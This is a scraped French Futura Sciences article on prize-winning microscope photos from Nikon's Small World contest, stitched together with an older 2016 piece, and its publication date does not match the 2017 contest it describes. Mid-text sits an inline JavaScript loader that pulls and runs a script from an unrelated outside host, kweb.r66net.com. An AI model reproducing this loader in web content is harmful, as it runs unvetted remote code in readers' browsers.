{"title": "Photomicrographie : les 5 plus belles images de sciences", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "26/10/2016", "content": "Cette année encore, Nikon, le fabricant japonais d'appareils photo, organisait un concours destiné à célébrer la beauté et la complexité de la nature telle que peuvent nous les révéler des images prises au microscope. Et le premier prix 2017 offre une vision exceptionnelle d'un objet que nous voyons pourtant tous les jours : notre peau. Depuis 1975, le fabricant japonais d'appareils photo Nikon propose aux amoureux de science et de jolies choses de montrer la beauté des sujets qu'ils étudient en participant au concours  Small World . Cette année encore, plus de 2.000 photos provenant de près de 90 pays étaient en compétition. Et la photo lauréate de l'édition 2017 révèle une nature sublime et un peu effrayante... Toutes les  photomicrographies récompensées par le jury  sont visibles en ligne.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les secrets de la peau humaine C'est pour une photo prise au  microscope  d'un échantillon de  peau humaine  qu'une équipe de chercheurs du  Netherlands Cancer Institute  (Pays-Bas) s'est vue attribuer le premier prix du concours  Small World  2017. Sur cette photo, on observe plus particulièrement une cellule de peau présentant une quantité excessive de kératine (en jaune). L'étude de la structure, de la dynamique et de la régulation des réseaux de kératine — un  marqueur tumoral  couramment employé — devrait permettre d'en apprendre plus sur le développement des cancers. Une cellule de peau humaine et ses filaments de kératine grossis 40 fois. © Bram van den Broek,  The Netherlands Cancer Institute                               Une mauvaise herbe à l’honneur de  Small World  2017 Le séneçon commun ou  Senecio vulgaris  est une plante extrêmement répandue dans nos jardins où elle s'invite plus qu'elle n'est cultivée. Ses fruits sont des akènes plumeux et volants comme ceux des  pissenlits . Et c'est justement grâce à une superbe photo de ses graines qu'un scientifique israélien, Havy Sarfaty, a décroché le deuxième prix du concours Small World 2017. Gros plan sur les fruits et les graines d’un séneçon commun, grossis 2 fois. © Havy Sarfaty,  Eyecare Clinic                               Une algue verte hors du commun C'est à une photo prise d'une  algue verte  d'eau douce du genre  Volvox , que le français Jean-Marc Babalian doit sa troisième place au concours  Small World  2017. Les  Volvox  intéressent les chercheurs car ils constituent un exemple d'algues à la frontière entre l'unicellulaire et le pluricellulaire. Leurs cellules somatiques, en effet, sont rassemblées mais non différenciées. Et l'on parle plus volontiers de colonie que d'organisme. Une algue du genre  Volvox  libérant des colonies filles, le tout grossi 100 fois. © Jean-Marc Babalian                               La tête d’un ténia s’affiche au  Small World  2017 Vous vous êtes toujours demandé à quoi ressemblait la tête d'un ténia ? Vous avez désormais la réponse et elle vaut la quatrième place du concours  Small World  2017 à Teresa Zgoda du  Rochester Institute of Technology  (États-Unis). Sachez toutefois que ce ténia armé ou  Taenia solium  — un  vers intestinal  qui ne provoque généralement pas de symptômes ou alors des  troubles digestifs  bénins — a presque disparu des pays industrialisés tant il est facile à déceler. Le scolex — la tête — évasé d’un ténia. © Teresa Zgoda,  Rochester Institute of Technology                               Une tomate moisie La cinquième place du concours  Small World  2017 revient à l'Israélien Dean Lerman pour une photo de  moisissure  à la surface d'une tomate. Après cela, vous ne verrez peut-être plus du même œil, ces petites excroissances cotonneuses qui ont la fâcheuse tendance à fleurir sur vos aliments. De la moisissure sur une tomate, grossie 3,9 fois. © Dean Lerman                               Pour en savoir plus La photomicrographie en 5 images stupéfiantes Article de Nathalie Mayer paru le 26/10/2016 Chaque année depuis 1975, Nikon, le fabricant japonais d'appareils photo organise un concours destiné à célébrer la beauté et la complexité de la nature telle que peuvent nous les révéler des images prises au microscope. En 2016, c'est la photo incroyable d'un  embryon  de  poisson  qui remporte le premier prix. Une  photomicrographie  constitue avant tout un document de travail dont la valeur se juge à son intérêt scientifique et/ou technique. Mais pour les participants au concours  Small World , organisé chaque année par le fabricant japonais d'appareils photo Nikon, une photomicrographie doit aussi savoir montrer la beauté du sujet étudié. Et c'est bien à ces deux critères que répond le grand gagnant de l'édition 2016. Toutes les  photomicrographies récompensées par le jury  cette année sont visibles en ligne. Un embryon de poisson-zèbre C'est à Oscar Ruiz, un généticien de l'université du Texas, que le jury a choisi d'attribuer le premier prix du concours  Small World  2016. Il est parvenu à photographier au  microscope confocal , et de face s'il vous plaît, un  embryon de poisson-zèbre  âgé de seulement 4 jours. Oscar Ruiz étudie le développement facial au niveau cellulaire dans le but de mieux comprendre le rôle du tissu épithélial dans l'apparition de maladies humaines. Il s'appuie sur le modèle du poisson et sur les  mutations génétiques  qui peuvent intervenir au cours des premiers stades de son développement embryonnaire et leurs liens avec des malformations du visage. Un embryon de poisson-zèbre âgé d’à peine 4 jours et grossi 10 fois. © Oscar Ruiz,  University of Texas                               La patte du scarabée plongeur Avec une photo prise au microscope confocal et grossie 100 fois d'une patte avant d'un  scarabée plongeur , Igor Siwanowicz décroche la cinquième place du concours. Le scarabée plongeur mesure jusqu'à 35 millimètres de long. Comme son nom l'indique, il a pour habitude de plonger, le plus souvent dans les mares et les étangs à végétation abondante, pour y trouver de la nourriture ( têtards ,  alevins ,  larves  et autres petits poissons). En laboratoire, il sert à étudier la production d' enzymes  protéolytiques lors de la  digestion  ainsi que le  système nerveux  des  insectes . Les ventouses qui ornent les pattes antérieures du scarabée plongeur apparaissent nettement sur cette photo. © Igor Siwanowicz,  Howard Hughes Medical Institute                       Des bulles de vitamine C Cette étonnante photo prise en microscopie en  lumière  polarisée et grossie 50 fois représente des bulles d' air  formées par des cristaux de vitamines C fondus. Elle vaut à Marek Mis, la sixième place du concours Small World. La  vitamine C  joue un rôle fondamental dans le  métabolisme  de l'être humain. Elle est sensible à la  chaleur  et à la lumière. Et les cristaux de  vitamine C  présentent des propriétés biréfringentes à l'origine des jolies  couleurs  qui apparaissent sur cette photo. Sur cette photo, des bulles d’air formées par des cristaux de vitamine C. © Marek Mis Photography                               Du caoutchouc et du verre Cette photo prise en microscopie en champ clair et grossie 20 fois est l'œuvre de James Hedrick, chimiste à l'université de Northwestern. Elle a été distinguée par le jury du concours Nikon. Elle figure un  caoutchouc  — le polydiméthylsiloxane, encore connu sous la désignation de PDMS — recouvert d'un mince film de verre. En refroidissant, le  caoutchouc  se contracte et entraîne des déformations du  verre . Quand le caoutchouc se mélange au verre. © James Hedrick,  Northwestern University                               La bouse de vache Avec cette photo prise en microscopie en champ sombre et grossie 30 fois, Michael Crutchley réussit la prouesse de rendre attrayante... une  bouse de vache  ! Il se place ainsi en vingtième position du concours. Et sachez que la bouse est d'un grand intérêt pour les entomologistes. Car, composée d'eau et de nombreuses  matières  organiques, elle attire des insectes  coprophages . De la bouse de vache comme vous n’en avez jamais vu. © Michael Crutchley                               Un moustique qui pique vu au microscope                       Sur cette vidéo, on peut observer comment un moustique fait bouger sa trompe (ou proboscis, en marron) à la recherche d'un vaisseau sanguin dans la peau d'une souris anesthésiée. Contrairement à une seringue, celle-ci n'est pas rigide mais bel et bien souple. Il finit enfin par trouver son bonheur autour de la 20e seconde et commence à aspirer le sang qui passe à sa portée. © Choumet et al., Plos One, 2012                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  belles formules  |  plus belles piscines  |  plus belles villes du monde", "theme": "planete"}